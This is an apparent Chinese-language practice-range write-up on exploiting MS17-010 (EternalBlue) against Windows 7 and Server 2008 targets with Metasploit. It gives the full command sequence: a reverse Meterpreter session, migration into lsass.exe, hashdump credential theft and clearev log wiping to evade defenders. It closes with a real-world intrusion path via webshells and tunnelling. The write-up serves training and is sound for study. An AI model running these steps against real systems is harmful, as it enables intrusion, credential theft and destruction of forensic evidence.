MS17-010 靶场实战记录

Win7 与 Server 2008 靶机权限获取过程
本文记录在本地靶场进行 MS17-010 永恒之蓝漏洞复现并获取靶机权限的过程。为保护隐私，本文中的真实 IP、用户名和 Hash 值均已隐藏。所有操作均在合法授权的本地靶场进行，严禁用于未经授权的非法渗透测试。

一、网络排障：从 100% 丢包到跨网段连通

启动 Kali 和 Win7 靶机后，我做的第一件事是 ping 靶机，结果 100% 丢包。排查发现，因为我连的是手机热点，Kali 桥接后位于热点网段，而靶机位于灵境平台内部的靶机网段，两者不在同一个局域网，且没有路由。

解决步骤：

  1. 在物理机 VMware 的“虚拟网络编辑器”中，选中 VMnet0，将“桥接到”从“自动”手动改成灵境创建的 LingJing 虚拟网卡。
  2. 重启 Kali，再次执行 ip a，发现 eth0 成功获取了灵境路由器网段的 IP。
  3. 添加静态路由，告诉 Kali 怎么去找靶机。
# 添加路由，将去往靶机网段的流量交给灵境路由器
sudo ip route add <靶机网段> via <灵境路由器IP> dev eth0

# 再次 ping 靶机
ping <靶机IP>
大意：
sudo 是使用管理员权限执行后面的命令。ip route add 是添加一条静态路由。<靶机网段> 是目标靶机所在的整个网段。via <灵境路由器IP> 是告诉 Kali，要去那个网段必须经过这个路由器。dev eth0 是指定从 eth0 这个网卡出去。
回显结果： 成功的话会回显 64 bytes from...，0% packet loss，代表网络打通。

二、Win7 靶机权限获取过程

网络通了之后，启动 MSF 进行攻击。

sudo msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <Win7靶机IP>
set LHOST <Kali IP>
run
大意：
sudo msfconsole 是以管理员权限启动 Metasploit 渗透框架。
use exploit/windows/smb/ms17_010_eternalblue 是加载 MS17-010 永恒之蓝的漏洞利用模块。
set RHOSTS <Win7靶机IP> 是设置目标靶机的 IP 地址。
set LHOST <Kali IP> 是设置反弹回连的 IP，也就是我的 Kali 的 IP，靶机成功被攻陷后会主动连回这个 IP。
run 是执行攻击。
回显结果： 屏幕出现大量 [+] 号，最终回显 Meterpreter session 1 opened。

输入 getuid 确认权限，回显 NT AUTHORITY\SYSTEM，拿到了靶机的最高权限。输入 sysinfo 确认系统为 Windows 7 SP1。

后渗透操作与排错：

先输入 ps 查看进程，准备进行进程迁移。

排错记录：找不到 lsass.exe 怎么办？
在 Win7 上，我按照常规操作在 ps 列表里找到了 PID 为 500 的 lsass.exe，执行 migrate 500 成功。
但是后面打 Server 2008 时，我用同样的方法却找不到 PID 500。于是我进入 shell，在 Windows 的 cmd 里执行了 tasklist | findstr lsass，精准定位到 2008 上的 lsass.exe PID 是 472。执行 exit 退回 meterpreter，输入 migrate 472 成功。新手遇到找不到进程时，不要慌，进 shell 用 tasklist 查即可。
大意： ps 是列出目标机器当前运行的所有进程。 migrate 500 是将我们的控制木马从漏洞利用进程迁移到 PID 500 的 lsass.exe 核心进程里，防止漏洞利用进程崩溃导致掉线。 hashdump 是抓取系统所有用户的密码哈希值。 arp -a 是查看内网环境。

三、Server 2008 靶机权限获取过程

在灵境平台启动 Server 2008 靶机，获取新 IP，并 ping 测通。然后复用之前的攻击流程：

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <Server2008靶机IP>
set LHOST <Kali IP>
run

成功获取会话，sysinfo 确认系统为 Windows Server 2008 R2，getuid 仍为 NT AUTHORITY\SYSTEM。

随后同样执行了 hashdump 抓取哈希，并确认了管理员权限。在此机器上，通过 tasklist 排错，成功将其进程迁移到了 PID 472。

四、清理与收尾

两台机器的权限都拿到后，我执行了清理操作：

screenshot
clearev
exit
大意：
screenshot 是截取目标靶机当前的桌面，留作战果。
clearev 是清理目标机器的系统日志、安全日志和应用日志，防止被防守方溯源。
exit 是退出当前会话。

回到物理机，以管理员权限打开 PowerShell，执行清理命令：

netsh interface portproxy reset
大意： 清理掉我们之前在物理机上设置的临时转发规则，保持本地环境干净。

五、经 AI 咨询的后续复盘

事后我向 AI 咨询，对这个漏洞和实战有了更清晰的理解：

  • 横向移动的本质：在靶场里，打 Win7 和打 Server 2008 的操作几乎一模一样，都是同一个漏洞和相同的后渗透命令。区别在于实战中的定位不同，Win7 通常是边缘跳板机，Server 2008 是核心业务服务器。
  • 真实 HVV 的路径：真实的 HVV 中，公网通常会封禁 445 端口，我们无法直接用 MS17-010 打进去。第一步通常是用 Web 漏洞如弱口令、越权、文件上传，拿到一台外网 Web 服务器的 Webshell，然后用隧道代理进入内网，最后才用今天记录的这套方法进行内网横向。
